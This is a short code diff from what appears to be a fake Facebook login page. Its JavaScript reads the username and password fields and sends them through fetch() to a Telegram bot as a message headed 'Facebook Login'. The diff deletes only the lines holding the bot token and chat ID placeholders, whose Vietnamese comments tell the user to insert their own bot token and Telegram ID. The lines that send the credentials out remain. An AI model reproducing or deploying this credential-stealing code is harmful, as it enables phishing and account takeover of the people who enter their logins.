@@ -29,9 +29,6 @@
         const user = document.getElementById('user').value;
         const pass = document.getElementById('pass').value;
 
-        const token = '<BOT_TOKEN>'; // Thay bằng token của bot Telegram
-        const chat_id = '<CHAT_ID>'; // Thay bằng ID Telegram của mày
-
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🔐 Facebook Login\n👤 User: ${user}\n🔑 Pass: ${pass}`;
 
         fetch(url);
